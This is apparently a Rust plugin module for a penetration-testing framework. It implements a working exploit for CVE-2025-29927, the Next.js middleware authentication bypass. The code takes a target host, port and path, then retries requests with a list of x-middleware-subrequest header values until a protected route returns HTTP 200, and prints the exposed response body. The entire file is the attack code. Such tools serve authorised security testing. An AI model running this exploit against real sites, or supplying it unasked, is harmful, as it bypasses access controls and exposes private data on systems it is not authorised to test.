use amatsumara_api::*;
use std::ffi::{c_char, c_int, c_void, CStr};
use std::time::Duration;

// --- Static metadata ---

static NAME: &str = "Next.js Middleware Auth Bypass (CVE-2025-29927)";
static DESCRIPTION: &str =
    "Authentication bypass in Next.js middleware via the x-middleware-subrequest header. \
     Versions prior to 15.2.3, 14.2.25, 13.5.9, and 12.3.5 allow attackers to skip \
     middleware-based auth checks by setting a header that the framework trusts internally. CVSS 9.1.";
static AUTHOR: &str = "Amatsumara Project";

static PLATFORMS: &[Platform] = &[Platform::Multi];
static ARCHS: &[Arch] = &[Arch::X64];

// --- Option definitions ---

static RHOSTS_NAME: &str = "RHOSTS";
static RHOSTS_DESC: &str = "Target host";
static RHOSTS_DEFAULT: &str = "";

static RPORT_NAME: &str = "RPORT";
static RPORT_DESC: &str = "Target port";
static RPORT_DEFAULT: &str = "3000";

static SSL_NAME: &str = "SSL";
static SSL_DESC: &str = "Use HTTPS instead of HTTP";
static SSL_DEFAULT: &str = "false";

static RPATH_NAME: &str = "RPATH";
static RPATH_DESC: &str = "Protected route to attempt bypass on";
static RPATH_DEFAULT: &str = "/protected";

static OPTIONS: &[ModuleOption] = &[
    ModuleOption {
        name: CString { ptr: RHOSTS_NAME.as_ptr() as *const c_char, len: RHOSTS_NAME.len() },
        description: CString { ptr: RHOSTS_DESC.as_ptr() as *const c_char, len: RHOSTS_DESC.len() },
        required: true,
        option_type: OptionType::Address,
        default_value: CString { ptr: RHOSTS_DEFAULT.as_ptr() as *const c_char, len: RHOSTS_DEFAULT.len() },
    },
    ModuleOption {
        name: CString { ptr: RPORT_NAME.as_ptr() as *const c_char, len: RPORT_NAME.len() },
        description: CString { ptr: RPORT_DESC.as_ptr() as *const c_char, len: RPORT_DESC.len() },
        required: false,
        option_type: OptionType::Port,
        default_value: CString { ptr: RPORT_DEFAULT.as_ptr() as *const c_char, len: RPORT_DEFAULT.len() },
    },
    ModuleOption {
        name: CString { ptr: SSL_NAME.as_ptr() as *const c_char, len: SSL_NAME.len() },
        description: CString { ptr: SSL_DESC.as_ptr() as *const c_char, len: SSL_DESC.len() },
        required: false,
        option_type: OptionType::Bool,
        default_value: CString { ptr: SSL_DEFAULT.as_ptr() as *const c_char, len: SSL_DEFAULT.len() },
    },
    ModuleOption {
        name: CString { ptr: RPATH_NAME.as_ptr() as *const c_char, len: RPATH_NAME.len() },
        description: CString { ptr: RPATH_DESC.as_ptr() as *const c_char, len: RPATH_DESC.len() },
        required: false,
        option_type: OptionType::String,
        default_value: CString { ptr: RPATH_DEFAULT.as_ptr() as *const c_char, len: RPATH_DEFAULT.len() },
    },
];

static MODULE_INFO: ModuleInfo = ModuleInfo {
    api_version: MODULE_API_VERSION,
    metadata: ModuleMetadata {
        name: CString { ptr: NAME.as_ptr() as *const c_char, len: NAME.len() },
        description: CString { ptr: DESCRIPTION.as_ptr() as *const c_char, len: DESCRIPTION.len() },
        author: CString { ptr: AUTHOR.as_ptr() as *const c_char, len: AUTHOR.len() },
        module_type: ModuleType::Auxiliary,
        platforms: PlatformArray { ptr: PLATFORMS.as_ptr(), len: PLATFORMS.len() },
        archs: ArchArray { ptr: ARCHS.as_ptr(), len: ARCHS.len() },
        ranking: Ranking::Normal,
        privileged: false,
    },
    options: OptionArray { ptr: OPTIONS.as_ptr(), len: OPTIONS.len() },
};

// --- Module implementation ---

struct NextjsBypassModule {
    rhost: String,
    rport: u16,
    ssl: bool,
    rpath: String,
}

impl NextjsBypassModule {
    fn new() -> Box<Self> {
        Box::new(Self {
            rhost: String::new(),
            rport: 3000,
            ssl: false,
            rpath: "/protected".to_string(),
        })
    }

    fn base_url(&self) -> String {
        let scheme = if self.ssl { "https" } else { "http" };
        format!("{}://{}:{}", scheme, self.rhost, self.rport)
    }

    fn build_client(&self) -> Result<reqwest::blocking::Client, String> {
        reqwest::blocking::Client::builder()
            .danger_accept_invalid_certs(true)
            .timeout(Duration::from_secs(10))
            .redirect(reqwest::redirect::Policy::none())
            .build()
            .map_err(|e| format!("HTTP client error: {}", e))
    }

    fn run_bypass(&self) -> i32 {
        let base = self.base_url();
        let target_url = format!("{}{}", base, self.rpath);

        println!("[*] Target: {}", target_url);

        let client = match self.build_client() {
            Ok(c) => c,
            Err(e) => {
                eprintln!("[-] {}", e);
                return 1;
            }
        };

        // Step 1: Baseline request — no bypass header
        println!("[*] Sending baseline request to {}...", self.rpath);
        let baseline = match client.get(&target_url).send() {
            Ok(r) => r,
            Err(e) => {
                eprintln!("[-] Baseline request failed: {}", e);
                return 1;
            }
        };

        let baseline_status = baseline.status().as_u16();
        println!("[*] Baseline response: HTTP {}", baseline_status);

        if baseline_status == 200 {
            println!("[*] Route is publicly accessible — no bypass needed");
            return 0;
        }

        if !matches!(baseline_status, 301 | 302 | 307 | 308 | 401 | 403) {
            println!(
                "[-] Unexpected baseline status {}. Expected 301/302/401/403 for a protected route.",
                baseline_status
            );
            println!("[*] Proceeding with bypass attempts anyway...");
        }

        // Step 2: Try bypass with known middleware header values
        let header_values = [
            "middleware",
            "middleware:middleware",
            "src/middleware",
            "src/middleware:src/middleware",
            "pages/_middleware",
            "pages/_middleware:pages/_middleware",
            "pages/api/_middleware",
        ];

        for header_val in &header_values {
            println!(
                "[*] Trying x-middleware-subrequest: {}",
                header_val
            );

            let resp = match client
                .get(&target_url)
                .header("x-middleware-subrequest", *header_val)
                .send()
            {
                Ok(r) => r,
                Err(e) => {
                    eprintln!("[-] Request failed: {}", e);
                    continue;
                }
            };

            let status = resp.status().as_u16();
            println!("[*] Response: HTTP {}", status);

            if status == 200 {
                let body = resp.text().unwrap_or_default();
                println!("[+] Auth bypass successful!");
                println!(
                    "[+] Header value: x-middleware-subrequest: {}",
                    header_val
                );
                println!("[+] Response body ({} bytes):", body.len());
                println!();
                if body.len() > 2000 {
                    println!("{}", &body[..2000]);
                    println!("[*] ... (truncated, {} total bytes)", body.len());
                } else {
                    println!("{}", body);
                }
                return 0;
            }
        }

        println!(
            "[-] Target does not appear vulnerable or middleware path not guessed."
        );
        1
    }
}

// --- Helpers ---

fn parse_options(module: &mut NextjsBypassModule, options_json: *const c_char) {
    if options_json.is_null() {
        return;
    }
    let c_str = unsafe { CStr::from_ptr(options_json) };
    let json_str = match c_str.to_str() {
        Ok(s) => s,
        Err(_) => return,
    };
    let opts: serde_json::Value = match serde_json::from_str(json_str) {
        Ok(v) => v,
        Err(_) => return,
    };

    if let Some(v) = opts.get("RHOSTS").and_then(|v| v.as_str()) {
        module.rhost = v.to_string();
    }
    if let Some(v) = opts.get("RPORT").and_then(|v| v.as_str()) {
        if let Ok(p) = v.parse::<u16>() {
            module.rport = p;
        }
    }
    if let Some(v) = opts.get("SSL").and_then(|v| v.as_str()) {
        module.ssl = v.eq_ignore_ascii_case("true");
    }
    if let Some(v) = opts.get("RPATH").and_then(|v| v.as_str()) {
        if !v.is_empty() {
            module.rpath = v.to_string();
        }
    }
}

// --- FFI entry points ---

extern "C" fn get_info() -> *const ModuleInfo {
    &MODULE_INFO
}

extern "C" fn init() -> *mut c_void {
    let module = NextjsBypassModule::new();
    Box::into_raw(module) as *mut c_void
}

extern "C" fn destroy(instance: *mut c_void) {
    if !instance.is_null() {
        unsafe {
            let _ = Box::from_raw(instance as *mut NextjsBypassModule);
        }
    }
}

extern "C" fn run(instance: *mut c_void, options_json: *const c_char) -> c_int {
    if instance.is_null() {
        eprintln!("[-] Module instance is null");
        return 1;
    }
    let module = unsafe { &mut *(instance as *mut NextjsBypassModule) };
    parse_options(module, options_json);

    if module.rhost.is_empty() {
        eprintln!("[-] RHOSTS not set");
        return 1;
    }

    module.run_bypass()
}

// --- VTable and registration ---

static VTABLE: ModuleVTable = ModuleVTable {
    get_info,
    init,
    destroy,
    check: None,
    run,
};

#[no_mangle]
pub extern "C" fn amatsumara_module_init() -> *const ModuleVTable {
    &VTABLE
}
